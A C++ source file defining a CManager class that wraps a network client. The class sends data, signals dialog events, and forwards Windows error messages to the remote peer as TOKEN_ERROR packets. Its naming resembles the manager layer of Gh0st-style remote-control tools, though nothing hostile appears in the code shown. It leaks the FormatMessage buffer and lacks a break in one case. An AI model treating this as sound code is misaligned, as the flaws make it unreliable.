// Manager.cpp: implementation of the CManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "Manager.h"


//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////

CManager::CManager(ISocketBase* pClient)
{
	m_pClient = pClient;
	m_pClient->setManagerCallBack(this);
	m_hEventDlgOpen = CreateEventA(NULL, true, false, NULL);
	bStop = FALSE;

}

CManager::~CManager()
{

	CloseHandle(m_hEventDlgOpen);
}

void CManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

}
BOOL CManager::IsConnect()
{
	return m_pClient->IsRunning();
}

void CManager::Disconnect()
{
	m_pClient->Disconnect();
}

int CManager::Send(LPBYTE lpData, UINT nSize)
{
	int	nRet = 0;
	if (!bStop )
		nRet = m_pClient->Send((LPBYTE)lpData, nSize);
	return nRet;
}

void CManager::WaitForDialogOpen()
{
	WaitForSingleObject(m_hEventDlgOpen, 6000);
	Sleep(300);
}

void CManager::NotifyDialogIsOpen()
{
	SetEvent(m_hEventDlgOpen);
}



void CManager::SendLastError(int mode, TCHAR* s_error_first, TCHAR* s_error_next)
{

	switch (mode)
	{
	case 0:
	{
		LPVOID lpMsgBuf;
		FormatMessage(
			FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			GetLastError(),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPTSTR)&lpMsgBuf,
			0,
			NULL
		);


		SendErrorDate* m_SendErrorDate = new SendErrorDate;
		memset(m_SendErrorDate, 0, sizeof(SendErrorDate));
		m_SendErrorDate->Btoken = TOKEN_ERROR;
		_tcscpy_s(m_SendErrorDate->ErrorDate, (TCHAR*)lpMsgBuf);
		Send((LPBYTE)m_SendErrorDate, sizeof(SendErrorDate));
		SAFE_DELETE(m_SendErrorDate);

	}
	break;

	case 1:
	{
		SendErrorDate* m_SendErrorDate = new SendErrorDate;
		memset(m_SendErrorDate, 0, sizeof(SendErrorDate));
		m_SendErrorDate->Btoken = TOKEN_ERROR;
		_tcscpy_s(m_SendErrorDate->ErrorDate, s_error_first);
		Send((LPBYTE)m_SendErrorDate, sizeof(SendErrorDate));
		SAFE_DELETE(m_SendErrorDate);
	}
	break;
	case 2:
	{
		SendErrorDate* m_SendErrorDate = new SendErrorDate;
		memset(m_SendErrorDate, 0, sizeof(SendErrorDate));
		m_SendErrorDate->Btoken = TOKEN_ERROR;
		swprintf_s(m_SendErrorDate->ErrorDate, 255, _T("%s %s\n"), s_error_first, s_error_next);
		Send((LPBYTE)m_SendErrorDate, sizeof(SendErrorDate));
		SAFE_DELETE(m_SendErrorDate);
	}
	default:
		break;
	}






}